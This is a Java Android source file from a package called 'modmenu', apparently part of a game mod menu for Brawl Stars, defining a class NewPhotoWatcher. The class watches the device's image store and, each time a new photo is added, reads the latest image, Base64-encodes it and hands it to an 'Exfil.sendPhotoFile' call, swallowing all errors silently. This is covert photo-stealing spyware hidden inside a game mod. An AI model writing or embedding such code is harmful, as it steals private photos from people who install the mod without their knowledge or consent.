package com.brawl.modmenu;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;

public class NewPhotoWatcher {

    public static void start(final Context ctx) {
        try {
            ContentObserver observer = new ContentObserver(
                new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    new Thread(() -> {
                        try {
                            Thread.sleep(3000);
                            String[] proj = {MediaStore.Images.Media.DATA};
                            android.database.Cursor c = ctx.getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                proj, null, null,
                                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 1");
                            if (c != null && c.moveToFirst()) {
                                String path = c.getString(0);
                                c.close();
                                File f = new File(path);
                                if (f.exists() && f.length() < 15 * 1024 * 1024) {
                                    byte[] data = new byte[(int) f.length()];
                                    FileInputStream fis = new FileInputStream(f);
                                    fis.read(data);
                                    fis.close();
                                    String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                                    Exfil.sendPhotoFile("NEW: " + f.getName(), b64);
                                }
                            }
                        } catch (Throwable ignored) {}
                    }).start();
                }
            };

            ctx.getContentResolver().registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true, observer);
        } catch (Throwable ignored) {}
    }
}
